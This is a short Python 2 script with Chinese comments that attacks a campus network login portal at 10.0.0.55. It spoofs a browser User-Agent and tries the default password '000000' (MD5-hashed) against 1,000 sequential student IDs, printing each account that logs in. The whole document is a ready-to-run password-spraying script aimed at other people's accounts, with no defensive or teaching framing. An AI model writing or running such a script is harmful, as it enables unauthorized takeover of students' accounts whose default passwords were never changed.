#encoding=utf8
import requests #Requests模块
import hashlib #hashlib模块

###登录页的url
url = 'http://10.0.0.55/cgi-bin/do_login'

###headers把程序伪装成浏览器
header = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36' }
def md5(str):
    m = hashlib.md5()
    m.update(str)
    return m.hexdigest()
def login(form_data):
    s = requests.session()
    #发出请请求
    response = s.post(url,data = form_data,headers = header)
    return response.content
def tryAccount(id_start,id_end,default_pass):
    ###登录需要提交的表单
    form_data = {'username':'XXXXXX', #填入网站的用户名
        'password':'XXXXXX',  #填入网站密码
        'drop':0,
        'type':1,
        'n':100
    }
    
    passwd = md5(default_pass)[8:24]
    form_data['password'] = passwd      #加密后的密码填入表单
    for i in range(id_start,id_end):
        form_data['username'] = str(i)  #用户名填入表单
        result = login(form_data)       #登录，获取 response 结果
        if result != 'password_error' and result != 'username_error':
            print str(i)+"\t"+result        #打印账号、密码正确的学号...
    print "\n上网不涉密，涉密不上网"
if __name__ == "__main__":
    ID_START = 1120140000   #起始学号
    ID_END = 1120141000     #结束学号
    DEFAULT_PASS = "000000" #初始密码
    tryAccount(ID_START,ID_END,DEFAULT_PASS)